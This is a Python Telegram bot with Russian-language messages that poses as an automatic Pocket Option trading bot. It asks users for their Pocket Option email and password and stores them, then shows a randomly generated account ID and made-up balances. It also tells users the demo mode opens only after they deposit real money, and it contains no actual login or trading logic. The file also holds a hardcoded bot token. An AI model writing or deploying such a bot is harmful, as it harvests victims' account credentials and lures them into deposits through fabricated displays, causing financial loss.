import asyncio
import logging
import random
from aiogram import Bot, Dispatcher, F, types
from aiogram.filters import CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup

# Токен вашего бота от @BotFather
BOT_TOKEN = "8905419939:AAH4AhrCIvA6s8TOdeY0CU48etE7lUKjTv0"

# Настройки ссылок (замените на свои)
REF_LINK = "https://pocketoption.com/register?utm_source=ref"
SUPPORT_LINK = "https://t.me/your_support"
FAQ_LINK = "https://t.me/your_faq"

# Картинки
IMAGE_WELCOME = "https://via.placeholder.com/600x350.png?text=Purosanc+Trade"
IMAGE_ACCOUNT = "https://via.placeholder.com/600x350.png?text=Выберите+Тип+Счёта"

# Состояния FSM
class AuthState(StatesGroup):
    waiting_for_email = State()
    waiting_for_password = State()

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())

# --- Клавиатуры ---

def get_start_keyboard():
    """Клавиатура при старте"""
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="🚀 Создать новый аккаунт", callback_data="create_acc")],
            [InlineKeyboardButton(text="🔑 Войти в существующий аккаунт", callback_data="login_acc")],
            [InlineKeyboardButton(text="🌐 Зарегистрироваться самостоятельно ↗", url=REF_LINK)],
            [InlineKeyboardButton(text="📞 Поддержка ↗", url=SUPPORT_LINK)]
        ]
    )

def get_main_menu_keyboard():
    """Клавиатура Главного Меню (из нового скриншота)"""
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="🚀 Начать торговлю", callback_data="start_trade")],
            [InlineKeyboardButton(text="💰 Пополнить", callback_data="deposit")],
            [InlineKeyboardButton(text="🎯 Настройки", callback_data="settings")],
            [
                InlineKeyboardButton(text="📞 Поддержка ↗", url=SUPPORT_LINK),
                InlineKeyboardButton(text="📕 F.A.Q ↗", url=FAQ_LINK)
            ],
            [InlineKeyboardButton(text="📕 Выйти из аккаунта РО", callback_data="logout")]
        ]
    )

# --- Вспомогательные функции ---

async def show_main_menu(target, email: str, uid: str = None, real_bal: float = 0.0, demo_bal: float = 54920.0):
    """Формирует и отправляет экран Главного Меню"""
    if not uid:
        uid = str(random.randint(10000000, 99999999))
        
    text = (
        "📱 **Главное меню**\n\n"
        f"📧 **Почта:**\n`{email}`\n\n"
        f"🆔 **UID профиля:**\n`{uid}`\n\n"
        f"💰 **СТАТИСТИКА РЕАЛЬНОГО СЧЁТА**\n"
        f"💵 Баланс: {real_bal:.2f} EUR\n"
        f"📊 Открыто сделок: 0 | Прибыль: 0.00\n\n"
        f"🎮 **СТАТИСТИКА ДЕМО СЧЁТА**\n"
        f"💵 Баланс: {demo_bal:,.2f} USD\n"
        f"📊 Открыто сделок: 0 | Прибыль: 0.00\n\n"
        f"🏆 **Статус:** 🥉 Bronze"
    )
    
    # Отправляем сообщение (может быть ответом на сообщение или callback)
    if isinstance(target, types.Message):
        await target.answer(text, parse_mode="Markdown", reply_markup=get_main_menu_keyboard())
    elif isinstance(target, types.CallbackQuery):
        await target.message.answer(text, parse_mode="Markdown", reply_markup=get_main_menu_keyboard())

# --- Хэндлеры ---

@dp.message(CommandStart())
async def cmd_start(message: types.Message, state: FSMContext):
    data = await state.get_data()
    # Если пользователь уже залогинен — сразу показываем Главное Меню
    if "email" in data:
        await show_main_menu(message, email=data["email"], uid=data.get("uid"))
        return

    await state.clear()
    user_name = message.from_user.first_name or "трейдер"
    
    caption_text = (
        f"👋 Привет, {user_name} ⚜️!\n\n"
        f"Я — торговый бот для Pocket Option.\n\n"
        f"🤖 **Что я умею:**\n"
        f"✅ Торгую автоматически на твоём счёте\n"
        f"✅ Использую мартингейл с защитой до 3 плечей\n"
        f"✅ Работаю 24/7 без участия менеджеров\n\n"
        f"Для начала нужно создать аккаунт на Pocket Option 👈\n\n"
        f"💡 Хотите зарегистрироваться сами?\n"
        f"Перейдите по ссылке 👉 [Регистрация тут]({REF_LINK})"
    )

    await message.answer_photo(
        photo=IMAGE_WELCOME,
        caption=caption_text,
        parse_mode="Markdown",
        reply_markup=get_start_keyboard()
    )

@dp.callback_query(F.data == "login_acc")
async def process_login(callback: types.CallbackQuery, state: FSMContext):
    await callback.answer()
    await callback.message.answer("📧 Введите email от Pocket Option:")
    await state.set_state(AuthState.waiting_for_email)

@dp.message(AuthState.waiting_for_email)
async def process_email(message: types.Message, state: FSMContext):
    await state.update_data(email=message.text)
    await message.answer(
        "🔒 Введите пароль Pocket Option.\n"
        "Сообщение будет удалено из чата после отправки."
    )
    await state.set_state(AuthState.waiting_for_password)

@dp.message(AuthState.waiting_for_password)
async def process_password(message: types.Message, state: FSMContext):
    password = message.text
    user_data = await state.get_data()
    email = user_data.get("email")
    generated_uid = str(random.randint(10000000, 99999999))

    # Удаляем пароль для безопасности
    try:
        await message.delete()
    except Exception:
        pass

    # Сохраняем логин и сгенерированный UID
    await state.update_data(email=email, password=password, uid=generated_uid)

    info_text = (
        "🎮 Демо-режим открывается после первого пополнения реального счёта.\n\n"
        "💳 Пополни реальный счёт — и демо станет доступно."
    )

    await message.answer_photo(
        photo=IMAGE_ACCOUNT,
        caption=info_text,
        parse_mode="Markdown"
    )

    # Задержка 2 секунды для имитации проверки и перевода в Главное Меню
    await asyncio.sleep(2)
    await show_main_menu(message, email=email, uid=generated_uid)

# Выход из аккаунта
@dp.callback_query(F.data == "logout")
async def process_logout(callback: types.CallbackQuery, state: FSMContext):
    await state.clear()
    await callback.answer("Вы успешно вышли из аккаунта", show_alert=True)
    await callback.message.answer("Вы вышли из системы. Нажмите /start для входа.")

async def main():
    logging.basicConfig(level=logging.INFO)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())